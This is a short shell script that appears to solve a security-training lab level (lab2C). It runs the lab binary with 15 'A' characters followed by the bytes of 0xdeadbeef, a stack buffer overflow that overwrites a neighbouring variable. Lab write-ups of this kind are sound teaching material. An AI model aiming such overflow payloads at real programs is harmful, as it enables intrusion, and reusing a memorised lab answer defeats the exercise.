#!/bin/sh
echo "Exploiting......"
/levels/lab02/lab2C `python2 -c 'print "A"*15+"\xef\xbe\xad\xde"'`
